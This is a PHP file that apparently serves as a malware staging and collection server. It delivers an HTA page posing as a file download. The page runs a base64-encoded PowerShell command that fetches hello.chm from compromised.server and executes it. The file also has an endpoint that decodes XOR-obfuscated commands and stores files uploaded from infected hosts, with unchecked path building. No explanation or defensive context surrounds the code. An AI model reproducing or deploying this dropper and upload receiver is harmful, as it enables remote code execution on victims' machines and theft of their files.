<?php
function xor_calc($string, $key)
{
  $output = '';
  for ($i = 0; $i < strlen($string); $i++) {
    $output .= chr(ord($string[$i]) ^ $key);
  }
  return $output;
}

if (empty($_GET)) {
  echo '
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Download File</title>
  <hta:application id="downloadFile" />
  <script>
  	var command = "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwBvAG0AcAByAG8AbQBpAHMAZQBkAC4AcwBlAHIAdgBlAHIALwBwAGEAeQBsAG8AYQBkAHMALwBoAGUAbABsAG8ALgBjAGgAbQAgAC0ATwB1AHQARgBpAGwAZQAgAGMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAaABlAGwAbABvAC4AYwBoAG0AIAB8ACAAYwBtAGQALgBlAHgAZQAgAC8AYwAgAGMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAaABlAGwAbABvAC4AYwBoAG0A";
  	var shell = new ActiveXObject("WScript.Shell");
	var exec = shell.Exec("powershell.exe -Enc \"" + command + "\"");
  </script>

  <script>
  self.close();
  </script>
</head>
<body>
  <h1>start.html file</h1>
  
  
</body>
</html>
';

} else {
  $encoded_params = array();
  $encoded_values = array();

  foreach ($_GET as $param => $value) {
    $encoded_params[] = xor_calc($param, 7);
    $encoded_values[] = xor_calc($value, 7);
  }

  if (in_array('type', $encoded_params)) {
    $type_index = array_search('type', $encoded_params);
    $type = $encoded_values[$type_index];


    if ($type == "ini") {
      $data_index = array_search('data', $encoded_params);
      $data = $encoded_values[$data_index];
      $dir_path = "../files/" . $data;
      if (!is_dir($dir_path)) {
        mkdir($dir_path, 0777, true);

      }

      echo "date";

    } else if ($type == "date") {
      echo "OK";
    } else if ($type == "file") {

      $uid_index = array_search('uid', $encoded_params);
      $uid = $encoded_values[$uid_index];
      $dir_path = "../files/" . $uid;

      if (isset($_FILES["file"])) {
        $file_name = $_FILES['file']['name'];
        $tmp_name = $_FILES['file']['tmp_name'];
        $target_file = $dir_path . '/' . $file_name;
        // Move the uploaded file to the target directory with the specified filename
        if (move_uploaded_file($tmp_name, $target_file)) {
          echo "OK";
        }
      }

    }
  }
}

?>